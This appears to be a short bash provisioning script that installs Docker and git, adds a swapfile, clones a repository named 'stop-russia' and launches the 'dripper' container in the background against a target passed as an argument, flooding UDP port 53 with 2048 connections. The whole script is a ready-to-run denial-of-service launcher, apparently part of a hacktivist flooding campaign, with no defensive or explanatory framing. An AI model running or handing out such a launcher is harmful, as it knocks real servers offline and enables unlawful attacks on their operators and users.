#!/bin/bash

apt -y update
apt -y install docker.io git

fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 

git clone https://github.com/brzhv-cyb/stop-russia.git

cd stop-russia && screen -d -m docker run -it --rm alexmon1989/dripper:latest -s $1 -p 53 -t 1 -m udp -l 2048
